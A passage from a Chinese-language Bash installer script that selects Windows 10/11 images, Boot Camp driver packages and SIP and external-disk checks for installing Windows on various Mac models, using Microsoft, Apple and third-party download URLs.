	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/1d069291-4370-4509-8546-d18645f0f188/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    drvname="2009ko.esd"
	name="2009ko.esd"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/f8da9f7a-96c3-4697-b59a-2eb42bdc3903/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    drvname="2009jp.esd"
	name="2009jp.esd"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/49904ca8-68fc-4da4-98cf-1c0781c019b6/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
    SourceSHA1="d262ad930f0f5554a061d2cb77ce3d305a3a65c0"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn_d262ad930f0f5554a061d2cb77ce3d305a3a65c0.esd"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	MBR10=""
	FenQu2
	fi

	
	if [ "${CustomizeURL}" = "s11" ]
	then
	if [ ! "$sip" ]; then
	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型SIP已关闭，使用正常RE模式"
    Customize
    fi
    if [ ! "$MBR10" ]; then
 	clear && printf "\e[3J"
	echo
	echo
	echo
	read -s -n1 -p "此机型请使用正常RE模式"
    Customize   
    fi    
    sip="1"
    sipp="1"
    Win11="1"
	PEDrv="1"
	repe="1"
	index="6"
	drvname="Win11.esd"
	name="Win11.esd"
	if [ "$sysyy" = "en" ]; then
	index="8"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/19819219-a992-4938-bdd1-97754bb369ad/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/05e4b71b-02fc-4825-801b-f64e106e311a/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/088f7856-c47e-459f-9f5d-77b8969be2cc/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/4f30abb7-ee8f-4c88-a753-619ded09b147/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
    SourceSHA1="923f912bdfd9374d9890fea8e0fa76a57d3db524"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn_923f912bdfd9374d9890fea8e0fa76a57d3db524.esd"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	MBR10=""
	FenQu2
	fi
				
	if [ "${CustomizeURL}" = "re1511" ]
	then
	PEDrv="1"
	repe="1"
	index="4"
	reg="1511"
	drvname="1511.esd"
	name="1511.esd"
	url="http://b1.download.windowsupdate.com/c/upgr/2016/05/10586.0.160426-1409.th2_refresh_clientprofessionalvl_vol_x64fre_zh-cn_72672798421fd8eca8fff3f4379ea323d877a8eb.esd"
    SourceSHA1="72672798421fd8eca8fff3f4379ea323d877a8eb"
	FenQu2
	fi

    if [ "${CustomizeURL}" = "jre1709" ]; then
	xtyh="1"
	CustomizeURL="re1709"
    fi
    
    if [ "${CustomizeURL}" = "jre10" ]; then
	xtyh="1"
	CustomizeURL="re10"
    fi
    
	if [ "${CustomizeURL}" = "jre1903" ]; then
	xtyh="1"
	CustomizeURL="re1903"
    fi
     
	if [ "${CustomizeURL}" = "jre1909" ]; then
	xtyh="1"
	CustomizeURL="re1909"
    fi
      
	if [ "${CustomizeURL}" = "jre2009" ]; then
	xtyh="1"
	CustomizeURL="re2009"
    fi
    
 	if [ "${CustomizeURL}" = "re17099" ]; then
	redrv="100"
	CustomizeURL="re1709"
    fi
    
 	if [ "${CustomizeURL}" = "re100" ]; then
	redrv="100"
	CustomizeURL="re10"
    fi
             
	if [ "${CustomizeURL}" = "jre11" ]; then
	xtyh="1"
	CustomizeURL="re11"
    fi
             
	if [ "${CustomizeURL}" = "re1709" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	pnputil="pnputil1709.exe"
	repe="1"
	index="6"
	drvname="1709.esd"
	name="1709.esd"
	SourceSHA1="d6bf989c6b57c7246fa72fec1e564808c3ee3255"
	url="http://wsus.ds.b1.download.windowsupdate.com/c/upgr/2017/10/16299.15.170928-1534.rs3_release_clientbusiness_vol_x64fre_zh-cn_d6bf989c6b57c7246fa72fec1e564808c3ee3255.esd"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
	fi	
		
	if [ "${CustomizeURL}" = "re10" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	index="6"
	drvname="1809.esd"
	name="1809.esd"
	SourceSHA1="a37dc7f616f37aa1f7a775b68144ad474086e190"
	url="http://fg.ds.b1.download.windowsupdate.com/c/Upgr/2018/09/17763.1.180914-1434.rs5_release_clientbusiness_vol_x64fre_zh-cn_a37dc7f616f37aa1f7a775b68144ad474086e190.esd"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "re1903" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	#reg="1909"
	index="6"
	drvname="1903.esd"
	name="1903.esd"
	SourceSHA1="077b5da46b95ed3420a4b132d083056835a734f5"
	url="http://fg.ds.b1.download.windowsupdate.com/d/Upgr/2019/04/18362.30.190401-1528.19h1_release_svc_refresh_clientbusiness_vol_x64fre_zh-cn_077b5da46b95ed3420a4b132d083056835a734f5.esd"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
	fi	
		
	if [ "${CustomizeURL}" = "re1909" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	index="6"
	drvname="1909.esd"
	name="1909.esd"
	if [ "$sysyy" = "en" ]; then
	index="8"
	drvname="1909en.esd"
	name="1909en.esd"
	SourceSHA1="d8e61d0513c6bb255bcf3b0f6fb5231484f252d7"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/bbd730ba-c42b-4cb8-a7ab-9d7624149182/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	drvname="1909tw.esd"
	name="1909tw.esd"
	SourceSHA1="7548fb3b318939db4c8de20b73139229ed92bdc1"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/d3e6bf19-fda0-4bdd-b183-64d9e00597d9/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    drvname="1909ko.esd"
	name="1909ko.esd"
    SourceSHA1="69999fe17b206900e5ae5139be97d93039348edb"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/47e48fde-1d0e-4eb2-a224-8bed946ca644/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    drvname="1909jp.esd"
	name="1909jp.esd"
    SourceSHA1="7e333df49c1bd0875cdeed3148fb84af752d72f1"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5bf0443e-bd94-49f7-9328-c1ba3bb590b1/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
    SourceSHA1="47102873fd333e715f06c840e08a149963cfb6a4"
	url="http://b1.download.windowsupdate.com/d/upgr/2020/11/18363.1139.201008-0514.19h2_release_svc_refresh_clientbusiness_vol_x64fre_zh-cn_47102873fd333e715f06c840e08a149963cfb6a4.esd"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
	fi
	
		
	if [ "${CustomizeURL}" = "re2009" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	index="6"
	drvname="2009.esd"
	name="2009.esd"
	if [ "$sysyy" = "en" ]; then
	index="8"
	drvname="2009en.esd"
	name="2009en.esd"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/fc218496-6e48-47e9-9df1-d5719b3a59fa/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	drvname="2009tw.esd"
	name="2009tw.esd"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/1d069291-4370-4509-8546-d18645f0f188/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    drvname="2009ko.esd"
	name="2009ko.esd"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/f8da9f7a-96c3-4697-b59a-2eb42bdc3903/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    drvname="2009jp.esd"
	name="2009jp.esd"
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/49904ca8-68fc-4da4-98cf-1c0781c019b6/19043.928.210409-1212.21h1_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
    SourceSHA1="d262ad930f0f5554a061d2cb77ce3d305a3a65c0"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn_d262ad930f0f5554a061d2cb77ce3d305a3a65c0.esd"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
	fi

		
	if [ "${CustomizeURL}" = "re11" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"
	echo	
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
    Win11="1"
	PEDrv="1"
	repe="1"
	index="6"
	drvname="Win11.esd"
	name="Win11.esd"
	if [ "$sysyy" = "en" ]; then
	index="8"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/19819219-a992-4938-bdd1-97754bb369ad/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/05e4b71b-02fc-4825-801b-f64e106e311a/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/088f7856-c47e-459f-9f5d-77b8969be2cc/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/4f30abb7-ee8f-4c88-a753-619ded09b147/22000.194.210913-1444.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
    SourceSHA1="923f912bdfd9374d9890fea8e0fa76a57d3db524"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn_923f912bdfd9374d9890fea8e0fa76a57d3db524.esd"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
	fi
	
	
	if [ "${CustomizeURL}" = "pe1909" ]
	then
	if [ "$MBR10" ]; then
	clear && printf "\e[3J"
	echo	
	echo
	echo
    read -s -n1 -p "本机不适合此安装方法！！！"
    Customize
	fi
	PEDrv="1"
	index="6"
	drvname="1909.esd"
	name="1909.esd"
	name3="PEDrv.iso"
	url3="$ip8/666/PEDrv.iso"
	if [ "$sysyy" = "en" ]; then
	index="9"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/bbd730ba-c42b-4cb8-a7ab-9d7624149182/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	fi
	if [ "$sysyy" = "tw" ]; then
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/d3e6bf19-fda0-4bdd-b183-64d9e00597d9/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
    fi
    if [ "$sysyy" = "ko" ]; then
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/47e48fde-1d0e-4eb2-a224-8bed946ca644/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
    fi
    if [ "$sysyy" = "jp" ]; then
    url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5bf0443e-bd94-49f7-9328-c1ba3bb590b1/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
    fi
    if [ "$sysyy" = "" ]; then
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/f9525f5e-75b3-430e-b304-d4dcf29577f9/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn.esd"
	fi
	FenQu2
	fi
		

	
	
	if [ "${CustomizeURL}" = "m700" ]; then
	mjh7="1"
	CustomizeURL="700"
    fi	 
		
	if [ "${CustomizeURL}" = "100" ];then
	Sys="1809"
	CustomizeURL="SysDrv"
	fi
	
	if [ "${CustomizeURL}" = "1909" ];then
	Sys="1909"
	CustomizeURL="SysDrv"
	fi	
	
	if [ "${CustomizeURL}" = "w11" ];then
	Sys="Win11"
	CustomizeURL="SysDrv"
	fi

    if [ "${CustomizeURL}" = "1002" ];then
	xtname="1809.dmg"
	name="1809.dmg"
	url="$ip8/666/1809_104.wim"
	FenQu2
	fi
	
	if [ "${CustomizeURL}" = "19092" ];then
	xtname="1909.dmg"
	name="1909.dmg"
	url="$ip8/666/1909_104.wim"
	FenQu2
	fi
	
    if [ "${CustomizeURL}" = "w112" ];then
	xtname="1909.dmg"
	name="1909.dmg"
	url="$ip8/666/Win11_104.wim"
	FenQu2
	fi 	
		
	if [ "${CustomizeURL}" = "SysDrv" ]
	then
	ipbc="1"
	if [ "$M1Yes" ]; then
	echo
    read -s -n1 -p "M1/M2电脑目前只支持安装虚拟机！！！"
    Customize	
	fi
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi	
	if [ "$Hostname" ]; then
	echo
	if [ "$mbr10" ]; then
	echo
    read -s -n1 -p "检测到移动盘，且此机型不支持安装到移动盘，请拔出！！！"
    Customize	
	fi
    read -s -n1 -p "检测到移动盘，如不需要安装到移动盘请拔出！" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi
    if [ "$Hostname" ]; then
    xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	fi	
	fi
	if [[ $modelxh = "10.10"* ]];then
	if [[ $modelbb = *"MacBook8,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookAir7,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookPro12,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookPro11,4"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookPro11,5"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	fi
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
    if [ "$sip" ]; then
    url="$ip8/BootCamp/2012Air.zip"
	else
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
    fi
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
    if [ "$sip" ]; then
    url="$ip8/BootCamp/2012Air.zip"
	else
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
    fi
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir4,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro10,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro10,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro9,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro9,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro8,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro8,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro8,3" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac12,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
